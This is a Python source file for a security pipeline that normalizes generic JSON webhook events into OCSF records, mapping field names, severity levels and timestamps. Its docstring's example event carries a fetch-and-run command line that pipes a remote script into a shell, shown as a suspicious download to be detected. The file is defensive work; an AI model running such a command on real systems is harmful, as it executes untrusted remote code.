"""
Generic JSON webhook event → OCSF normalizer.

Input is one JSON object posted to ``POST /api/v1/ingest``.  The endpoint adds
``_webhook_source`` (connector name) and ``_received_at``.  Example:

{
  "_webhook_source": "custom-source",
  "_received_at": "2026-01-01T12:00:01+00:00",
  "timestamp": "2026-01-01T12:00:00Z",
  "host": "web01",
  "user": "alice",
  "src_ip": "203.0.113.5",
  "command_line": "curl http://198.51.100.7/x.sh | sh",
  "message": "Suspicious download",
  "severity": "high",
  "event_type": "process_start"
}

Common field names are mapped (the first name that is present wins):

  timestamp, time, @timestamp                  → time (ISO 8601 or epoch seconds / ms)
  host, hostname                               → dst_endpoint.hostname (reporting host)
  user, username, user_name                    → actor_user.name
  src_ip, source_ip                            → src_endpoint.ip
  dst_ip, dest_ip, destination_ip              → dst_endpoint.ip
  src_port, source_port                        → src_endpoint.port
  dst_port, dest_port, destination_port        → dst_endpoint.port
  process, process_name                        → process.name
  process_path, image, exe                     → process.path
  command_line, cmd_line, commandline, command → process.cmd_line
  pid, process_id                              → process.pid
  message, msg                                 → unmapped.message
  severity, level                              → severity_id
  id, event_id                                 → metadata_uid
  os, os_name                                  → dst_endpoint.os_name
  service                                      → unmapped.service

Every other top-level field is kept in ``unmapped`` under its own name so that
Sigma rules can reference it.  The full original object is kept in ``raw``.

OCSF class: Process Activity when a process, process path or command line is present,
Network Activity when both a source and a destination address are present,
otherwise Base Event (class_uid 0).
"""

from __future__ import annotations

from datetime import UTC, datetime
from typing import Any

from .ocsf import (
    SEVERITY_MAP,
    Endpoint,
    OCSFCategory,
    OCSFClass,
    OCSFEvent,
    ProcessInfo,
    UserInfo,
)

_TIME_KEYS      = ("timestamp", "time", "@timestamp")
_HOST_KEYS      = ("host", "hostname")
_USER_KEYS      = ("user", "username", "user_name")
_SRC_IP_KEYS    = ("src_ip", "source_ip")
_DST_IP_KEYS    = ("dst_ip", "dest_ip", "destination_ip")
_SRC_PORT_KEYS  = ("src_port", "source_port")
_DST_PORT_KEYS  = ("dst_port", "dest_port", "destination_port")
_PROCESS_KEYS   = ("process", "process_name")
_PROCESS_PATH_KEYS = ("process_path", "image", "exe")
_CMD_LINE_KEYS  = ("command_line", "cmd_line", "commandline", "command")
_PID_KEYS       = ("pid", "process_id")
_MESSAGE_KEYS   = ("message", "msg")
_SEVERITY_KEYS  = ("severity", "level")
_EVENT_ID_KEYS  = ("id", "event_id")
_OS_KEYS        = ("os", "os_name")
_SERVICE_KEYS   = ("service",)

_MAPPED_KEYS = frozenset(
    _TIME_KEYS + _HOST_KEYS + _USER_KEYS + _SRC_IP_KEYS + _DST_IP_KEYS
    + _SRC_PORT_KEYS + _DST_PORT_KEYS + _PROCESS_KEYS + _PROCESS_PATH_KEYS + _CMD_LINE_KEYS + _PID_KEYS
    + _MESSAGE_KEYS + _SEVERITY_KEYS + _EVENT_ID_KEYS + _OS_KEYS + _SERVICE_KEYS
)

# Severity names accepted in addition to the keys of SEVERITY_MAP.
_SEVERITY_ALIASES: dict[str, int] = {
    **SEVERITY_MAP,
    "informational": 1,
    "information":   1,
    "notice":        2,
    "warning":       3,
    "warn":          3,
    "error":         4,
    "err":           4,
    "fatal":         5,
    "emergency":     5,
    "alert":         5,
}

_SUMMARY_MAX_CHARS = 500
_EPOCH_MILLIS_THRESHOLD = 1e11   # larger numeric timestamps are milliseconds


class WebhookNormalizer:
    """Transforms an already-structured JSON event into an OCSFEvent."""

    def normalize(self, raw: dict[str, Any]) -> OCSFEvent:
        cmd_line = self._first_str(raw, _CMD_LINE_KEYS)
        process_name = self._first_str(raw, _PROCESS_KEYS)
        process_path = self._first_str(raw, _PROCESS_PATH_KEYS)
        src_ip = self._first_str(raw, _SRC_IP_KEYS)
        dst_ip = self._first_str(raw, _DST_IP_KEYS)
        message = self._first_str(raw, _MESSAGE_KEYS)
        event_id = self._first(raw, _EVENT_ID_KEYS)
        service = self._first(raw, _SERVICE_KEYS)

        if cmd_line or process_name or process_path:
            class_uid, class_name, category_uid = (
                OCSFClass.PROCESS_ACTIVITY, "Process Activity", OCSFCategory.SYSTEM_ACTIVITY,
            )
        elif src_ip and dst_ip:
            class_uid, class_name, category_uid = (
                OCSFClass.NETWORK_ACTIVITY, "Network Activity", OCSFCategory.NETWORK,
            )
        else:
            class_uid, class_name, category_uid = 0, "Base Event", 0

        unmapped: dict[str, Any] = {
            key: value
            for key, value in raw.items()
            if key not in _MAPPED_KEYS and not key.startswith("_")
        }
        unmapped["source"] = raw.get("_webhook_source")
        if message is not None:
            unmapped["message"] = message
            unmapped["summary"] = message[:_SUMMARY_MAX_CHARS]
        if service is not None:
            unmapped["service"] = service

        return OCSFEvent(
            class_uid=class_uid,
            class_name=class_name,
            category_uid=category_uid,
            time=self._parse_time(self._first(raw, _TIME_KEYS)),
            severity_id=self._parse_severity(self._first(raw, _SEVERITY_KEYS)),
            metadata_product="Webhook",
            metadata_uid=str(event_id) if event_id is not None else None,
            src_endpoint=Endpoint(
                ip=src_ip,
                port=self._safe_int(self._first(raw, _SRC_PORT_KEYS)),
            ),
            dst_endpoint=Endpoint(
                hostname=self._first_str(raw, _HOST_KEYS),
                ip=dst_ip,
                port=self._safe_int(self._first(raw, _DST_PORT_KEYS)),
                os_name=self._first_str(raw, _OS_KEYS),
            ),
            actor_user=UserInfo(name=self._first_str(raw, _USER_KEYS)),
            process=ProcessInfo(
                name=process_name,
                path=process_path,
                cmd_line=cmd_line,
                pid=self._safe_int(self._first(raw, _PID_KEYS)),
            ),
            raw=raw,
            unmapped=unmapped,
        )

    # ── Helpers ──────────────────────────────────────────────────────────────

    def _first(self, raw: dict[str, Any], keys: tuple[str, ...]) -> Any:
        """Value of the first key in *keys* that is present and not empty."""
        for key in keys:
            value = raw.get(key)
            if value is not None and value != "":
                return value
        return None

    def _first_str(self, raw: dict[str, Any], keys: tuple[str, ...]) -> str | None:
        """Like :meth:`_first`, for fields that must be a string (scalars only)."""
        value = self._first(raw, keys)
        if value is None or isinstance(value, dict | list):
            return None
        return str(value)

    def _parse_time(self, ts: Any) -> datetime:
        now = datetime.now(UTC)
        if isinstance(ts, bool):
            return now
        if isinstance(ts, int | float):
            seconds = ts / 1000 if ts > _EPOCH_MILLIS_THRESHOLD else ts
            try:
                return datetime.fromtimestamp(seconds, tz=UTC)
            except (OverflowError, OSError, ValueError):
                return now
        if not isinstance(ts, str):
            return now
        try:
            parsed = datetime.fromisoformat(ts.replace("Z", "+00:00"))
        except ValueError:
            return now
        return parsed if parsed.tzinfo else parsed.replace(tzinfo=UTC)

    def _parse_severity(self, value: Any) -> int:
        if isinstance(value, bool) or value is None:
            return 1
        if isinstance(value, int | float):
            return min(max(int(value), 0), 5)
        return _SEVERITY_ALIASES.get(str(value).strip().lower(), 1)

    def _safe_int(self, val: Any) -> int | None:
        try:
            return int(val) if val is not None else None
        except (TypeError, ValueError):
            return None
